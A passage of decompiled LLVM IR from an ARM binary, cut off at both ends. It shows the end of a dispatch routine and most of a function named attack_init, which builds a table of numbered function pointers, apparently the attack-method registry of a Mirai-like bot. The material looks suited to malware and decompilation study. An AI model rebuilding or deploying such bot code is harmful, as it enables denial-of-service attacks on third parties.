bb50:                                             ; preds = %dec_label_pc_a23c
  %v2_a264 = icmp eq i1 %v7_a24c, false
  store i1 %v2_a264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a264, label %dec_label_pc_a2b4, label %dec_label_pc_a26c

dec_label_pc_a26c:                                ; preds = %dec_label_pc_a1fc, %dec_label_pc_a1e0, %dec_label_pc_a1d8, %dec_label_pc_a1b4, %.thread14, %bb50, %dec_label_pc_a1a0, %dec_label_pc_a188, %dec_label_pc_a16c
  store i32 %v2_a120, i32* %r3.global-to-local, align 4
  %v2_a270 = icmp eq i32 %v2_a120, 0
  store i1 %v2_a270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a270, label %bb52, label %bb51

bb51:                                             ; preds = %dec_label_pc_a26c
  store i32 %v2_a120, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %dec_label_pc_a26c, %bb51
  store i32 41596, i32* @lr, align 4
  %v1_a278 = xor i1 %v2_a270, true
  call void @__pseudo_cond_branch(i1 %v1_a278, i32 ptrtoint (i32* @global_var_1504c.63 to i32))
  %v0_a27c = load i32, i32* @r6, align 4
  %v2_a27c = icmp eq i32 %v0_a27c, 0
  store i1 %v2_a27c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a27c, label %.dec_label_pc_a0b0_crit_edge, label %dec_label_pc_a284

.dec_label_pc_a0b0_crit_edge:                     ; preds = %bb52
  %v1_a0b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0b0

dec_label_pc_a284:                                ; preds = %bb52
  %v0_a284 = load i32, i32* @r5, align 4
  %v2_a284 = icmp eq i32 %v0_a284, 0
  store i1 %v2_a284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a284, label %dec_label_pc_a2a8, label %dec_label_pc_a28c

dec_label_pc_a28c:                                ; preds = %dec_label_pc_a284
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_a290

dec_label_pc_a290:                                ; preds = %dec_label_pc_a290, %dec_label_pc_a28c
  %v1_a290 = phi i32 [ 0, %dec_label_pc_a28c ], [ %v1_a29c, %dec_label_pc_a290 ]
  %v0_a290 = phi i32 [ %v0_a27c, %dec_label_pc_a28c ], [ %v0_a2a8.pre, %dec_label_pc_a290 ]
  %v4_a290 = mul i32 %v1_a290, 8
  %v5_a290 = add i32 %v4_a290, %v0_a290
  %v6_a290 = inttoptr i32 %v5_a290 to i32*
  %v7_a290 = load i32, i32* %v6_a290, align 4
  store i32 %v7_a290, i32* %r0.global-to-local, align 4
  %v2_a294 = icmp eq i32 %v7_a290, 0
  store i1 %v2_a294, i1* %cpsr_z.global-to-local, align 1
  store i32 41628, i32* @lr, align 4
  %v1_a298 = xor i1 %v2_a294, true
  call void @__pseudo_cond_branch(i1 %v1_a298, i32 ptrtoint (i32* @global_var_1504c.63 to i32))
  %v0_a29c = load i32, i32* @r4, align 4
  %v1_a29c = add i32 %v0_a29c, 1
  store i32 %v1_a29c, i32* @r4, align 4
  %v0_a2a0 = load i32, i32* @r5, align 4
  %v9_a2a0 = icmp eq i32 %v0_a2a0, %v1_a29c
  store i1 %v9_a2a0, i1* %cpsr_z.global-to-local, align 1
  %v0_a2a8.pre = load i32, i32* @r6, align 4
  br i1 %v9_a2a0, label %dec_label_pc_a2a8, label %dec_label_pc_a290

dec_label_pc_a2a8:                                ; preds = %dec_label_pc_a290, %dec_label_pc_a284
  %v0_a2a8 = phi i32 [ %v0_a27c, %dec_label_pc_a284 ], [ %v0_a2a8.pre, %dec_label_pc_a290 ]
  store i32 %v0_a2a8, i32* @r0, align 4
  %v0_a2ac = call i32 @free()
  store i32 %v0_a2ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0b0

dec_label_pc_a2b4:                                ; preds = %bb50
  store i32 ptrtoint (i8** @global_var_24640.65 to i32), i32* %r3.global-to-local, align 4
  %v2_a2b8 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a2b8 = zext i8 %v2_a2b8 to i32
  store i32 %v3_a2b8, i32* %r0.global-to-local, align 4
  %v2_a2bc = icmp eq i8 %v2_a2b8, 0
  store i1 %v2_a2bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a2bc, label %dec_label_pc_a320, label %dec_label_pc_a2c4

dec_label_pc_a2c4:                                ; preds = %dec_label_pc_a2b4
  store i32 ptrtoint (i32* @global_var_24644.67 to i32), i32* %r3.global-to-local, align 4
  %v2_a2c8 = load i32, i32* @global_var_24644.67, align 4
  store i32 %v2_a2c8, i32* %r1.global-to-local, align 4
  %v1_a2cc = inttoptr i32 %v2_a2c8 to i32*
  %v2_a2cc = load i32, i32* %v1_a2cc, align 4
  store i32 %v2_a2cc, i32* %ip.global-to-local, align 4
  %v1_a2d4 = add i32 %v2_a2cc, 4
  %v2_a2d4 = inttoptr i32 %v1_a2d4 to i8*
  %v3_a2d4 = load i8, i8* %v2_a2d4, align 1
  %v4_a2d4 = zext i8 %v3_a2d4 to i32
  store i32 %v4_a2d4, i32* %r3.global-to-local, align 4
  %v9_a2d8 = icmp eq i8 %v3_a2d4, %v3_a0e4
  store i1 %v9_a2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a2d8, label %dec_label_pc_a300, label %dec_label_pc_a2e0

dec_label_pc_a2e0:                                ; preds = %dec_label_pc_a2c4, %dec_label_pc_a2ec
  %v0_a2e0 = phi i32 [ %v1_a2e0, %dec_label_pc_a2ec ], [ 0, %dec_label_pc_a2c4 ]
  %v1_a2e0 = add i32 %v0_a2e0, 1
  %v9_a2e4 = icmp eq i32 %v1_a2e0, %v3_a2b8
  store i1 %v9_a2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a2e4, label %dec_label_pc_a320, label %dec_label_pc_a2ec

dec_label_pc_a2ec:                                ; preds = %dec_label_pc_a2e0
  %v4_a2ec = mul i32 %v1_a2e0, 4
  %v5_a2ec = add i32 %v4_a2ec, %v2_a2c8
  %v6_a2ec = inttoptr i32 %v5_a2ec to i32*
  %v7_a2ec = load i32, i32* %v6_a2ec, align 4
  store i32 %v7_a2ec, i32* %ip.global-to-local, align 4
  %v1_a2f4 = add i32 %v7_a2ec, 4
  %v2_a2f4 = inttoptr i32 %v1_a2f4 to i8*
  %v3_a2f4 = load i8, i8* %v2_a2f4, align 1
  %v4_a2f4 = zext i8 %v3_a2f4 to i32
  store i32 %v4_a2f4, i32* %r3.global-to-local, align 4
  %v9_a2f8 = icmp eq i8 %v3_a2f4, %v3_a0e4
  store i1 %v9_a2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a2f8, label %dec_label_pc_a300, label %dec_label_pc_a2e0

dec_label_pc_a300:                                ; preds = %dec_label_pc_a2ec, %dec_label_pc_a2c4
  %v0_a314 = phi i32 [ %v2_a2cc, %dec_label_pc_a2c4 ], [ %v7_a2ec, %dec_label_pc_a2ec ]
  store i32 %v5_a0d4, i32* %r0.global-to-local, align 4
  %v0_a308 = load i32, i32* @sb, align 4
  store i32 %v0_a308, i32* %r1.global-to-local, align 4
  %v0_a310 = load i32, i32* @r5, align 4
  store i32 %v0_a310, i32* %r3.global-to-local, align 4
  %v1_a314 = inttoptr i32 %v0_a314 to i32*
  %v2_a314 = load i32, i32* %v1_a314, align 4
  store i32 %v2_a314, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_a314)
  br label %dec_label_pc_a320

dec_label_pc_a320:                                ; preds = %dec_label_pc_a2e0, %dec_label_pc_a2b4, %dec_label_pc_a300
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_a324 = call i32 @__GI_exit(i32 0)
  store i32 %v1_a324, i32* %r0.global-to-local, align 4
  %v0_a328 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a328, label %bb54, label %.thread17

bb54:                                             ; preds = %dec_label_pc_a320
  br label %.thread17

.thread17:                                        ; preds = %dec_label_pc_a320, %bb54
  ret i32 %v1_a324

; uselistorder directives
  uselistorder i1 %v9_a2f8, { 1, 0 }
  uselistorder i32 %v1_a2e0, { 1, 2, 0 }
  uselistorder i1 %v9_a2d8, { 1, 0 }
  uselistorder i32 %v0_a2ac, { 1, 0 }
  uselistorder i32 %v1_a29c, { 1, 2, 0 }
  uselistorder i1 %v2_a270, { 0, 2, 1 }
  uselistorder i1 %v2_a264, { 1, 0 }
  uselistorder i1 %v7_a24c, { 1, 0 }
  uselistorder i32 %v0_a248, { 2, 1, 0, 3 }
  uselistorder i32 %v0_a234, { 1, 0 }
  uselistorder i32 %v2_a204, { 1, 0 }
  uselistorder i32 %v1_a200, { 2, 0, 1, 3 }
  uselistorder i32 %v4_a1fc, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a1e0, { 1, 0 }
  uselistorder i32 %v3_a174, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a164, { 1, 0 }
  uselistorder i32 %v1_a160, { 1, 0 }
  uselistorder i32 %v2_a120, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v4_a0f4, { 1, 0, 2, 3 }
  uselistorder i32 %v5_a0d4, { 1, 0 }
  uselistorder i32 %v1_a0c0, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_a0bc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_a0a8, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 6, 7, 3, 4, 5, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 8, 6, 19, 7, 9, 10, 11, 13, 12, 20, 21, 14, 15, 16, 17, 18, 22, 23, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 1, 2, 3, 5, 6, 7, 8, 9, 10, 11, 0, 12, 17, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %dec_label_pc_a320, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a2e0, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %dec_label_pc_a26c, { 5, 4, 0, 1, 2, 3, 6, 7, 8 }
  uselistorder label %dec_label_pc_a214, { 1, 0 }
  uselistorder label %dec_label_pc_a0b0, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_a330 = load i32, i32* @r4, align 4
  store i32 %v3_a330, i32* %stack_var_-24, align 4
  %v6_a330 = load i32, i32* @r5, align 4
  %v9_a330 = load i32, i32* @r6, align 4
  %v12_a330 = load i32, i32* @r7, align 4
  %v15_a330 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a33c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_24640.65 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24644.67 to i32), i32* @r6, align 4
  store i32 52348, i32* %r2.global-to-local, align 4
  store i32 %v2_a33c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_24641.71 to i32), i32* %r1.global-to-local, align 4
  %v2_a35c = load i32, i32* @global_var_24644.67, align 4
  %v2_a360 = inttoptr i32 %v2_a33c to i32*
  store i32 52348, i32* %v2_a360, align 4
  %v3_a364 = load i32, i32* @r4, align 4
  %v4_a364 = add i32 %v3_a364, 4
  %v5_a364 = inttoptr i32 %v4_a364 to i8*
  store i8 0, i8* %v5_a364, align 1
  %v0_a368 = load i32, i32* %r1.global-to-local, align 4
  %v3_a368 = mul i32 %v0_a368, 4
  store i32 %v3_a368, i32* %r1.global-to-local, align 4
  %v5_a36c = inttoptr i32 %v2_a35c to i32*
  %v6_a36c = call i32 @realloc(i32* %v5_a36c, i32 %v3_a368, i32 52348, i32 0)
  %v2_a370 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a370 = zext i8 %v2_a370 to i32
  store i32 %v6_a36c, i32* %r2.global-to-local, align 4
  %v0_a378 = load i32, i32* @r4, align 4
  %v5_a378 = mul nuw nsw i32 %v3_a370, 4
  %v6_a378 = add i32 %v5_a378, %v6_a36c
  %v7_a378 = inttoptr i32 %v6_a378 to i32*
  store i32 %v0_a378, i32* %v7_a378, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_24641.71 to i32), i32* %r3.global-to-local, align 4
  %v1_a388 = load i32, i32* @r6, align 4
  %v2_a388 = inttoptr i32 %v1_a388 to i32*
  store i32 %v6_a36c, i32* %v2_a388, align 4
  %v0_a38c = load i32, i32* %r3.global-to-local, align 4
  %v1_a38c = trunc i32 %v0_a38c to i8
  %v2_a38c = load i32, i32* @r5, align 4
  %v3_a38c = inttoptr i32 %v2_a38c to i8*
  store i8 %v1_a38c, i8* %v3_a38c, align 1
  %v2_a390 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_d248.73 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_a390, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_24641.71 to i32), i32* %r1.global-to-local, align 4
  %v2_a3a8 = load i32, i32* @global_var_24644.67, align 4
  %v2_a3ac = inttoptr i32 %v2_a390 to i32*
  store i32 ptrtoint (i32* @global_var_d248.73 to i32), i32* %v2_a3ac, align 4
  %v0_a3b0 = load i32, i32* @r8, align 4
  %v1_a3b0 = trunc i32 %v0_a3b0 to i8
  %v2_a3b0 = load i32, i32* @r4, align 4
  %v3_a3b0 = add i32 %v2_a3b0, 4
  %v4_a3b0 = inttoptr i32 %v3_a3b0 to i8*
  store i8 %v1_a3b0, i8* %v4_a3b0, align 1
  %v0_a3b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a3b4 = mul i32 %v0_a3b4, 4
  store i32 %v3_a3b4, i32* %r1.global-to-local, align 4
  %v4_a3b8 = inttoptr i32 %v2_a3a8 to i32*
  %v5_a3b8 = call i32 @realloc(i32* %v4_a3b8, i32 %v3_a3b4, i32 %v6_a36c, i32 ptrtoint (i32* @global_var_d248.73 to i32))
  %v2_a3bc = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a3bc = zext i8 %v2_a3bc to i32
  store i32 %v3_a3bc, i32* %r3.global-to-local, align 4
  store i32 %v5_a3b8, i32* %r2.global-to-local, align 4
  %v0_a3c4 = load i32, i32* @r4, align 4
  %v5_a3c4 = mul nuw nsw i32 %v3_a3bc, 4
  %v6_a3c4 = add i32 %v5_a3c4, %v5_a3b8
  %v7_a3c4 = inttoptr i32 %v6_a3c4 to i32*
  store i32 %v0_a3c4, i32* %v7_a3c4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a3cc = load i32, i32* %r3.global-to-local, align 4
  %v1_a3cc = load i32, i32* @r8, align 4
  %v2_a3cc = add i32 %v1_a3cc, %v0_a3cc
  store i32 %v2_a3cc, i32* %r3.global-to-local, align 4
  %v1_a3d4 = trunc i32 %v2_a3cc to i8
  %v2_a3d4 = load i32, i32* @r5, align 4
  %v3_a3d4 = inttoptr i32 %v2_a3d4 to i8*
  store i8 %v1_a3d4, i8* %v3_a3d4, align 1
  %v0_a3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a3d8 = load i32, i32* @r6, align 4
  %v2_a3d8 = inttoptr i32 %v1_a3d8 to i32*
  store i32 %v0_a3d8, i32* %v2_a3d8, align 4
  %v2_a3dc = call i32 @calloc(i32 %v1_a3cc, i32 8)
  %v2_a3e0 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a3e0 = zext i8 %v2_a3e0 to i32
  store i32 ptrtoint (i32* @global_var_d6b4.75 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a3dc, i32* @r4, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_a3f0 = load i32, i32* @r8, align 4
  %v2_a3f0 = add i32 %v1_a3f0, %v3_a3e0
  store i32 %v2_a3f0, i32* %r1.global-to-local, align 4
  %v2_a3f4 = load i32, i32* @global_var_24644.67, align 4
  %v2_a3f8 = inttoptr i32 %v2_a3dc to i32*
  store i32 ptrtoint (i32* @global_var_d6b4.75 to i32), i32* %v2_a3f8, align 4
  %v3_a3fc = load i32, i32* @r4, align 4
  %v4_a3fc = add i32 %v3_a3fc, 4
  %v5_a3fc = inttoptr i32 %v4_a3fc to i8*
  store i8 2, i8* %v5_a3fc, align 1
  %v0_a400 = load i32, i32* %r1.global-to-local, align 4
  %v3_a400 = mul i32 %v0_a400, 4
  store i32 %v3_a400, i32* %r1.global-to-local, align 4
  %v5_a404 = inttoptr i32 %v2_a3f4 to i32*
  %v6_a404 = call i32 @realloc(i32* %v5_a404, i32 %v3_a400, i32 ptrtoint (i32* @global_var_d6b4.75 to i32), i32 2)
  %v2_a408 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a408 = zext i8 %v2_a408 to i32
  store i32 %v3_a408, i32* %r3.global-to-local, align 4
  store i32 %v6_a404, i32* %r2.global-to-local, align 4
  %v0_a410 = load i32, i32* @r4, align 4
  %v5_a410 = mul nuw nsw i32 %v3_a408, 4
  %v6_a410 = add i32 %v5_a410, %v6_a404
  %v7_a410 = inttoptr i32 %v6_a410 to i32*
  store i32 %v0_a410, i32* %v7_a410, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a418 = load i32, i32* %r3.global-to-local, align 4
  %v1_a418 = load i32, i32* @r8, align 4
  %v2_a418 = add i32 %v1_a418, %v0_a418
  store i32 %v2_a418, i32* %r3.global-to-local, align 4
  %v1_a420 = load i32, i32* @r6, align 4
  %v2_a420 = inttoptr i32 %v1_a420 to i32*
  store i32 %v6_a404, i32* %v2_a420, align 4
  %v0_a424 = load i32, i32* %r3.global-to-local, align 4
  %v1_a424 = trunc i32 %v0_a424 to i8
  %v2_a424 = load i32, i32* @r5, align 4
  %v3_a424 = inttoptr i32 %v2_a424 to i8*
  store i8 %v1_a424, i8* %v3_a424, align 1
  %v2_a428 = call i32 @calloc(i32 %v1_a418, i32 8)
  %v2_a42c = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a42c = zext i8 %v2_a42c to i32
  store i32 ptrtoint (i32* @global_var_c9bc.77 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_a428, i32* @r4, align 4
  %v1_a43c = load i32, i32* @r8, align 4
  %v2_a43c = add i32 %v1_a43c, %v3_a42c
  store i32 %v2_a43c, i32* %r1.global-to-local, align 4
  %v2_a440 = load i32, i32* @global_var_24644.67, align 4
  %v2_a444 = inttoptr i32 %v2_a428 to i32*
  store i32 ptrtoint (i32* @global_var_c9bc.77 to i32), i32* %v2_a444, align 4
  %v0_a448 = load i32, i32* @r7, align 4
  %v1_a448 = trunc i32 %v0_a448 to i8
  %v2_a448 = load i32, i32* @r4, align 4
  %v3_a448 = add i32 %v2_a448, 4
  %v4_a448 = inttoptr i32 %v3_a448 to i8*
  store i8 %v1_a448, i8* %v4_a448, align 1
  %v0_a44c = load i32, i32* %r1.global-to-local, align 4
  %v3_a44c = mul i32 %v0_a44c, 4
  store i32 %v3_a44c, i32* %r1.global-to-local, align 4
  %v4_a450 = inttoptr i32 %v2_a440 to i32*
  %v5_a450 = call i32 @realloc(i32* %v4_a450, i32 %v3_a44c, i32 %v6_a404, i32 ptrtoint (i32* @global_var_c9bc.77 to i32))
  %v2_a454 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a454 = zext i8 %v2_a454 to i32
  store i32 %v3_a454, i32* %r3.global-to-local, align 4
  store i32 %v5_a450, i32* %r2.global-to-local, align 4
  %v0_a45c = load i32, i32* @r4, align 4
  %v5_a45c = mul nuw nsw i32 %v3_a454, 4
  %v6_a45c = add i32 %v5_a45c, %v5_a450
  %v7_a45c = inttoptr i32 %v6_a45c to i32*
  store i32 %v0_a45c, i32* %v7_a45c, align 4
  %v0_a460 = load i32, i32* @r7, align 4
  store i32 %v0_a460, i32* %r1.global-to-local, align 4
  %v0_a464 = load i32, i32* %r3.global-to-local, align 4
  %v1_a464 = load i32, i32* @r8, align 4
  %v2_a464 = add i32 %v1_a464, %v0_a464
  store i32 %v2_a464, i32* %r3.global-to-local, align 4
  %v1_a46c = trunc i32 %v2_a464 to i8
  %v2_a46c = load i32, i32* @r5, align 4
  %v3_a46c = inttoptr i32 %v2_a46c to i8*
  store i8 %v1_a46c, i8* %v3_a46c, align 1
  %v0_a470 = load i32, i32* %r2.global-to-local, align 4
  %v1_a470 = load i32, i32* @r6, align 4
  %v2_a470 = inttoptr i32 %v1_a470 to i32*
  store i32 %v0_a470, i32* %v2_a470, align 4
  %v2_a474 = call i32 @calloc(i32 %v1_a464, i32 %v0_a460)
  %v2_a478 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a478 = zext i8 %v2_a478 to i32
  store i32 ptrtoint (i32* @global_var_c2e4.79 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a474, i32* @r4, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_a488 = load i32, i32* @r8, align 4
  %v2_a488 = add i32 %v1_a488, %v3_a478
  store i32 %v2_a488, i32* %r1.global-to-local, align 4
  %v2_a48c = load i32, i32* @global_var_24644.67, align 4
  %v2_a490 = inttoptr i32 %v2_a474 to i32*
  store i32 ptrtoint (i32* @global_var_c2e4.79 to i32), i32* %v2_a490, align 4
  %v3_a494 = load i32, i32* @r4, align 4
  %v4_a494 = add i32 %v3_a494, 4
  %v5_a494 = inttoptr i32 %v4_a494 to i8*
  store i8 3, i8* %v5_a494, align 1
  %v0_a498 = load i32, i32* %r1.global-to-local, align 4
  %v3_a498 = mul i32 %v0_a498, 4
  store i32 %v3_a498, i32* %r1.global-to-local, align 4
  %v5_a49c = inttoptr i32 %v2_a48c to i32*
  %v6_a49c = call i32 @realloc(i32* %v5_a49c, i32 %v3_a498, i32 ptrtoint (i32* @global_var_c2e4.79 to i32), i32 3)
  %v2_a4a0 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a4a0 = zext i8 %v2_a4a0 to i32
  store i32 %v3_a4a0, i32* %r3.global-to-local, align 4
  store i32 %v6_a49c, i32* %r2.global-to-local, align 4
  %v0_a4a8 = load i32, i32* @r4, align 4
  %v5_a4a8 = mul nuw nsw i32 %v3_a4a0, 4
  %v6_a4a8 = add i32 %v5_a4a8, %v6_a49c
  %v7_a4a8 = inttoptr i32 %v6_a4a8 to i32*
  store i32 %v0_a4a8, i32* %v7_a4a8, align 4
  %v0_a4ac = load i32, i32* @r7, align 4
  store i32 %v0_a4ac, i32* %r1.global-to-local, align 4
  %v0_a4b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a4b0 = load i32, i32* @r8, align 4
  %v2_a4b0 = add i32 %v1_a4b0, %v0_a4b0
  store i32 %v2_a4b0, i32* %r3.global-to-local, align 4
  %v1_a4b8 = trunc i32 %v2_a4b0 to i8
  %v2_a4b8 = load i32, i32* @r5, align 4
  %v3_a4b8 = inttoptr i32 %v2_a4b8 to i8*
  store i8 %v1_a4b8, i8* %v3_a4b8, align 1
  %v0_a4bc = load i32, i32* %r2.global-to-local, align 4
  %v1_a4bc = load i32, i32* @r6, align 4
  %v2_a4bc = inttoptr i32 %v1_a4bc to i32*
  store i32 %v0_a4bc, i32* %v2_a4bc, align 4
  %v2_a4c0 = call i32 @calloc(i32 %v1_a4b0, i32 %v0_a4ac)
  %v2_a4c4 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a4c4 = zext i8 %v2_a4c4 to i32
  store i32 ptrtoint (i32* @global_var_bbc0.81 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a4c0, i32* @r4, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_a4d4 = load i32, i32* @r8, align 4
  %v2_a4d4 = add i32 %v1_a4d4, %v3_a4c4
  store i32 %v2_a4d4, i32* %r1.global-to-local, align 4
  %v2_a4d8 = load i32, i32* @global_var_24644.67, align 4
  %v2_a4dc = inttoptr i32 %v2_a4c0 to i32*
  store i32 ptrtoint (i32* @global_var_bbc0.81 to i32), i32* %v2_a4dc, align 4
  %v3_a4e0 = load i32, i32* @r4, align 4
  %v4_a4e0 = add i32 %v3_a4e0, 4
  %v5_a4e0 = inttoptr i32 %v4_a4e0 to i8*
  store i8 4, i8* %v5_a4e0, align 1
  %v0_a4e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a4e4 = mul i32 %v0_a4e4, 4
  store i32 %v3_a4e4, i32* %r1.global-to-local, align 4
  %v5_a4e8 = inttoptr i32 %v2_a4d8 to i32*
  %v6_a4e8 = call i32 @realloc(i32* %v5_a4e8, i32 %v3_a4e4, i32 ptrtoint (i32* @global_var_bbc0.81 to i32), i32 4)
  %v2_a4ec = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a4ec = zext i8 %v2_a4ec to i32
  store i32 %v3_a4ec, i32* %r3.global-to-local, align 4
  store i32 %v6_a4e8, i32* %r2.global-to-local, align 4
  %v0_a4f4 = load i32, i32* @r4, align 4
  %v5_a4f4 = mul nuw nsw i32 %v3_a4ec, 4
  %v6_a4f4 = add i32 %v5_a4f4, %v6_a4e8
  %v7_a4f4 = inttoptr i32 %v6_a4f4 to i32*
  store i32 %v0_a4f4, i32* %v7_a4f4, align 4
  %v0_a4f8 = load i32, i32* @r7, align 4
  store i32 %v0_a4f8, i32* %r1.global-to-local, align 4
  %v0_a4fc = load i32, i32* %r3.global-to-local, align 4
  %v1_a4fc = load i32, i32* @r8, align 4
  %v2_a4fc = add i32 %v1_a4fc, %v0_a4fc
  store i32 %v2_a4fc, i32* %r3.global-to-local, align 4
  %v1_a504 = trunc i32 %v2_a4fc to i8
  %v2_a504 = load i32, i32* @r5, align 4
  %v3_a504 = inttoptr i32 %v2_a504 to i8*
  store i8 %v1_a504, i8* %v3_a504, align 1
  %v0_a508 = load i32, i32* %r2.global-to-local, align 4
  %v1_a508 = load i32, i32* @r6, align 4
  %v2_a508 = inttoptr i32 %v1_a508 to i32*
  store i32 %v0_a508, i32* %v2_a508, align 4
  %v2_a50c = call i32 @calloc(i32 %v1_a4fc, i32 %v0_a4f8)
  %v2_a510 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a510 = zext i8 %v2_a510 to i32
  store i32 ptrtoint (i32* @global_var_b394.83 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a50c, i32* @r4, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_a520 = load i32, i32* @r8, align 4
  %v2_a520 = add i32 %v1_a520, %v3_a510
  store i32 %v2_a520, i32* %r1.global-to-local, align 4
  %v2_a524 = load i32, i32* @global_var_24644.67, align 4
  %v2_a528 = inttoptr i32 %v2_a50c to i32*
  store i32 ptrtoint (i32* @global_var_b394.83 to i32), i32* %v2_a528, align 4
  %v3_a52c = load i32, i32* @r4, align 4
  %v4_a52c = add i32 %v3_a52c, 4
  %v5_a52c = inttoptr i32 %v4_a52c to i8*
  store i8 5, i8* %v5_a52c, align 1
  %v0_a530 = load i32, i32* %r1.global-to-local, align 4
  %v3_a530 = mul i32 %v0_a530, 4
  store i32 %v3_a530, i32* %r1.global-to-local, align 4
  %v5_a534 = inttoptr i32 %v2_a524 to i32*
  %v6_a534 = call i32 @realloc(i32* %v5_a534, i32 %v3_a530, i32 ptrtoint (i32* @global_var_b394.83 to i32), i32 5)
  %v2_a538 = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a538 = zext i8 %v2_a538 to i32
  store i32 %v3_a538, i32* %r3.global-to-local, align 4
  store i32 %v6_a534, i32* %r2.global-to-local, align 4
  %v0_a540 = load i32, i32* @r4, align 4
  %v5_a540 = mul nuw nsw i32 %v3_a538, 4
  %v6_a540 = add i32 %v5_a540, %v6_a534
  %v7_a540 = inttoptr i32 %v6_a540 to i32*
  store i32 %v0_a540, i32* %v7_a540, align 4
  %v0_a544 = load i32, i32* @r7, align 4
  store i32 %v0_a544, i32* %r1.global-to-local, align 4
  %v0_a548 = load i32, i32* %r3.global-to-local, align 4
  %v1_a548 = load i32, i32* @r8, align 4
  %v2_a548 = add i32 %v1_a548, %v0_a548
  store i32 %v2_a548, i32* %r3.global-to-local, align 4
  %v1_a550 = trunc i32 %v2_a548 to i8
  %v2_a550 = load i32, i32* @r5, align 4
  %v3_a550 = inttoptr i32 %v2_a550 to i8*
  store i8 %v1_a550, i8* %v3_a550, align 1
  %v0_a554 = load i32, i32* %r2.global-to-local, align 4
  %v1_a554 = load i32, i32* @r6, align 4
  %v2_a554 = inttoptr i32 %v1_a554 to i32*
  store i32 %v0_a554, i32* %v2_a554, align 4
  %v2_a558 = call i32 @calloc(i32 %v1_a548, i32 %v0_a544)
  %v2_a55c = load i8, i8* bitcast (i8** @global_var_24640.65 to i8*), align 4
  %v3_a55c = zext i8 %v2_a55c to i32
  store i32 ptrtoint (i32* @global_var_ad34.85 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a558, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_a56c = load i32, i32* @r8, align 4
